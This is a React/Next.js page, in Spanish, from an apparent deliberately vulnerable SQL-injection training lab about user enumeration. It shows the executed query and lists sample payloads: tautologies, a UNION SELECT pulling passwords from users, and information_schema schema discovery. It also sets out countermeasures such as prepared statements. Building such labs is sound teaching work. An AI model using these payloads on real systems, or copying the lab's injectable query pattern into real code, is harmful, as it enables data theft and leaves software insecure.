'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';

interface User {
  id: number;
  username: string;
  email: string;
  role: string;
  created_at: string;
}

export default function SQLiUsersPage() {
  const [users, setUsers] = useState<User[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [filters, setFilters] = useState({
    userId: '',
    username: '',
    role: ''
  });
  const [lastQuery, setLastQuery] = useState('');

  const fetchUsers = async () => {
    setLoading(true);
    setError('');

    try {
      const params = new URLSearchParams();
      if (filters.userId) params.append('id', filters.userId);
      if (filters.username) params.append('username', filters.username);
      if (filters.role) params.append('role', filters.role);

      const response = await fetch(`/api/users?${params.toString()}`);
      const data = await response.json();

      if (data.success) {
        setUsers(data.users);
        setLastQuery(data.query);
      } else {
        setError(data.message);
      }
    } catch (err) {
      setError('Error fetching users');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchUsers();
  }, []);

  const handleFilterChange = (field: string, value: string) => {
    setFilters(prev => ({ ...prev, [field]: value }));
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-black to-purple-900">
      <div className="container mx-auto px-4 max-w-6xl py-8">
        <div className="mb-6">
          <Link href="/" className="text-purple-400 hover:text-purple-300 flex items-center font-medium transition-colors duration-300">
            ← Volver al inicio
          </Link>
        </div>

        <div className="text-center mb-12">
          <h1 className="text-5xl font-bold bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent mb-4">
            SQL Injection - User Enumeration
          </h1>
          <div className="flex justify-center items-center mb-4">
            <div className="h-px bg-gradient-to-r from-transparent via-purple-500 to-transparent w-64"></div>
          </div>
          <p className="text-xl text-gray-300 max-w-2xl mx-auto">
            Explota vulnerabilidades en filtros y parámetros para enumerar usuarios del sistema
          </p>
          <p className="text-lg text-purple-400 font-semibold bg-purple-900/20 border border-purple-500/30 rounded-lg p-3 max-w-2xl mx-auto mt-4">
            👥 LABORATORIO DE ENUMERACIÓN DE USUARIOS
          </p>
        </div>

        <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-8 border border-purple-500/30 mb-8">
          <h2 className="text-2xl font-bold text-white mb-6 flex items-center">
            <span className="w-8 h-8 bg-purple-600 rounded-lg flex items-center justify-center mr-3">
              🔍
            </span>
            Filtros de Usuario Vulnerables
          </h2>

          <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-6">
            <div>
              <label className="block text-sm font-medium text-purple-300 mb-2">
                ID de Usuario
              </label>
              <input
                type="text"
                value={filters.userId}
                onChange={(e) => handleFilterChange('userId', e.target.value)}
                placeholder="ej: 1 OR 1=1"
                className="w-full px-4 py-3 bg-gray-700/50 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-purple-300 mb-2">
                Nombre de Usuario
              </label>
              <input
                type="text"
                value={filters.username}
                onChange={(e) => handleFilterChange('username', e.target.value)}
                placeholder="ej: ' OR '1'='1"
                className="w-full px-4 py-3 bg-gray-700/50 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-purple-300 mb-2">
                Rol
              </label>
              <input
                type="text"
                value={filters.role}
                onChange={(e) => handleFilterChange('role', e.target.value)}
                placeholder="ej: admin' --"
                className="w-full px-4 py-3 bg-gray-700/50 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent"
              />
            </div>

            <div className="flex items-end">
              <button
                onClick={fetchUsers}
                disabled={loading}
                className="w-full px-6 py-3 bg-gradient-to-r from-purple-600 to-pink-600 text-white rounded-lg hover:from-purple-700 hover:to-pink-700 disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-300 font-medium"
              >
                {loading ? 'Ejecutando...' : 'Ejecutar Query'}
              </button>
            </div>
          </div>

          {lastQuery && (
            <div className="mb-6 p-4 bg-gray-700/50 rounded-lg border border-purple-500/30">
              <div className="flex items-center mb-2">
                <span className="w-6 h-6 bg-green-600 rounded-lg flex items-center justify-center mr-2">
                  ⚡
                </span>
                <span className="font-semibold text-green-400">Consulta SQL ejecutada:</span>
              </div>
              <code className="block mt-2 text-sm text-gray-300 font-mono bg-gray-800/70 p-3 rounded border border-green-500/30">{lastQuery}</code>
            </div>
          )}

          {error && (
            <div className="mb-6 p-4 bg-red-900/30 border border-red-500/50 text-red-300 rounded-lg">
              <div className="flex items-center">
                <span className="w-6 h-6 bg-red-600 rounded-lg flex items-center justify-center mr-2">
                  ⚠️
                </span>
                <span className="font-semibold">Error SQL:</span>
              </div>
              <p className="mt-2 font-mono text-sm">{error}</p>
            </div>
          )}
        </div>

        <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-8 border border-purple-500/30">
          <h2 className="text-2xl font-bold text-white mb-6 flex items-center">
            <span className="w-8 h-8 bg-green-600 rounded-lg flex items-center justify-center mr-3">
              📊
            </span>
            Resultados de la Consulta ({users.length} usuarios)
          </h2>

          {users.length > 0 ? (
            <div className="overflow-x-auto">
              <table className="min-w-full divide-y divide-gray-600">
                <thead className="bg-gray-700/50">
                  <tr>
                    <th className="px-6 py-4 text-left text-xs font-bold text-purple-300 uppercase tracking-wider">
                      ID
                    </th>
                    <th className="px-6 py-4 text-left text-xs font-bold text-purple-300 uppercase tracking-wider">
                      Usuario
                    </th>
                    <th className="px-6 py-4 text-left text-xs font-bold text-purple-300 uppercase tracking-wider">
                      Email
                    </th>
                    <th className="px-6 py-4 text-left text-xs font-bold text-purple-300 uppercase tracking-wider">
                      Rol
                    </th>
                    <th className="px-6 py-4 text-left text-xs font-bold text-purple-300 uppercase tracking-wider">
                      Creado
                    </th>
                  </tr>
                </thead>
                <tbody className="bg-gray-800/30 divide-y divide-gray-600">
                  {users.map((user, index) => (
                    <tr key={user.id} className={`hover:bg-gray-700/30 transition-colors duration-200 ${index % 2 === 0 ? 'bg-gray-800/20' : ''}`}>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-300 font-mono">
                        {user.id}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-white">
                        {user.username}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-300">
                        {user.email}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <span className={`inline-flex px-3 py-1 text-xs font-bold rounded-full ${
                          user.role === 'admin'
                            ? 'bg-red-600/20 text-red-300 border border-red-500/30'
                            : 'bg-green-600/20 text-green-300 border border-green-500/30'
                        }`}>
                          {user.role}
                        </span>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-300 font-mono">
                        {new Date(user.created_at).toLocaleDateString()}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          ) : (
            <div className="text-center py-12">
              <div className="w-16 h-16 bg-gray-700 rounded-xl flex items-center justify-center mx-auto mb-4">
                <span className="text-2xl">🔍</span>
              </div>
              <p className="text-gray-400 text-lg">No se encontraron usuarios</p>
              <p className="text-gray-500 text-sm mt-2">Prueba con diferentes payloads de SQL injection</p>
            </div>
          )}
        </div>

        <div className="mt-8 grid grid-cols-1 lg:grid-cols-2 gap-8">
          <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-8 border border-red-500/30">
            <h3 className="text-2xl font-bold mb-6 text-red-400 flex items-center">
              <span className="w-8 h-8 bg-red-600 rounded-lg flex items-center justify-center mr-3">
                🎯
              </span>
              Payloads Avanzados
            </h3>
            <div className="space-y-6">
              <div>
                <h4 className="font-semibold text-red-300 mb-3 flex items-center">
                  <span className="w-4 h-4 bg-red-600 rounded mr-2"></span>
                  Parameter Injection
                </h4>
                <div className="space-y-2">
                  <div className="bg-gray-700/50 rounded-lg p-3 border border-red-500/30">
                    <p className="text-xs text-red-300 mb-1">ID:</p>
                    <code className="text-gray-300 font-mono text-sm">1 OR 1=1</code>
                  </div>
                  <div className="bg-gray-700/50 rounded-lg p-3 border border-red-500/30">
                    <p className="text-xs text-red-300 mb-1">Username:</p>
                    <code className="text-gray-300 font-mono text-sm">' OR '1'='1</code>
                  </div>
                  <div className="bg-gray-700/50 rounded-lg p-3 border border-red-500/30">
                    <p className="text-xs text-red-300 mb-1">Role (Union):</p>
                    <code className="text-gray-300 font-mono text-sm break-all">admin' UNION SELECT 1,username,password,email,role FROM users --</code>
                  </div>
                </div>
              </div>

              <div>
                <h4 className="font-semibold text-orange-300 mb-3 flex items-center">
                  <span className="w-4 h-4 bg-orange-600 rounded mr-2"></span>
                  Advanced Enumeration
                </h4>
                <div className="space-y-2">
                  <div className="bg-gray-700/50 rounded-lg p-3 border border-orange-500/30">
                    <p className="text-xs text-orange-300 mb-1">Schema Discovery:</p>
                    <code className="text-gray-300 font-mono text-sm break-all">' UNION SELECT table_name,column_name,null,null,null FROM information_schema.columns --</code>
                  </div>
                  <div className="bg-gray-700/50 rounded-lg p-3 border border-orange-500/30">
                    <p className="text-xs text-orange-300 mb-1">Privilege Escalation:</p>
                    <code className="text-gray-300 font-mono text-sm">admin&apos; OR (SELECT COUNT(*) FROM users WHERE role=&apos;admin&apos;)&gt;0 --</code>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-2xl p-8 border border-green-500/30">
            <h3 className="text-2xl font-bold mb-6 text-green-400 flex items-center">
              <span className="w-8 h-8 bg-green-600 rounded-lg flex items-center justify-center mr-3">
                🛡️
              </span>
              Contramedidas de Seguridad
            </h3>
            <div className="space-y-6">
              <div>
                <h4 className="font-semibold text-green-300 mb-3 flex items-center">
                  <span className="w-4 h-4 bg-green-600 rounded mr-2"></span>
                  Implementación Segura
                </h4>
                <ul className="space-y-3 text-gray-300">
                  <li className="flex items-start">
                    <span className="text-green-400 mr-2 mt-1">✓</span>
                    <div>
                      <strong className="text-green-300">Prepared Statements:</strong>
                      <span className="text-sm text-gray-400 block">Usar parámetros enlazados para evitar concatenación de strings</span>
                    </div>
                  </li>
                  <li className="flex items-start">
                    <span className="text-green-400 mr-2 mt-1">✓</span>
                    <div>
                      <strong className="text-green-300">Input Validation:</strong>
                      <span className="text-sm text-gray-400 block">Validar tipos de datos y rangos permitidos</span>
                    </div>
                  </li>
                  <li className="flex items-start">
                    <span className="text-green-400 mr-2 mt-1">✓</span>
                    <div>
                      <strong className="text-green-300">Principle of Least Privilege:</strong>
                      <span className="text-sm text-gray-400 block">Limitar permisos del usuario de base de datos</span>
                    </div>
                  </li>
                </ul>
              </div>

              <div>
                <h4 className="font-semibold text-blue-300 mb-3 flex items-center">
                  <span className="w-4 h-4 bg-blue-600 rounded mr-2"></span>
                  Detección y Monitoreo
                </h4>
                <ul className="space-y-3 text-gray-300">
                  <li className="flex items-start">
                    <span className="text-blue-400 mr-2 mt-1">•</span>
                    <div>
                      <strong className="text-blue-300">WAF (Web Application Firewall)</strong>
                      <span className="text-sm text-gray-400 block">Filtrado de payloads maliciosos</span>
                    </div>
                  </li>
                  <li className="flex items-start">
                    <span className="text-blue-400 mr-2 mt-1">•</span>
                    <div>
                      <strong className="text-blue-300">Query Monitoring</strong>
                      <span className="text-sm text-gray-400 block">Logging y análisis de consultas anómalas</span>
                    </div>
                  </li>
                  <li className="flex items-start">
                    <span className="text-blue-400 mr-2 mt-1">•</span>
                    <div>
                      <strong className="text-blue-300">Rate Limiting</strong>
                      <span className="text-sm text-gray-400 block">Limitar intentos de inyección automatizados</span>
                    </div>
                  </li>
                </ul>
              </div>

              <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-4">
                <p className="text-sm text-green-300">
                  <strong>💡 Tip Pro:</strong> Combina múltiples capas de defensa para una protección robusta
                  contra ataques de SQL injection.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}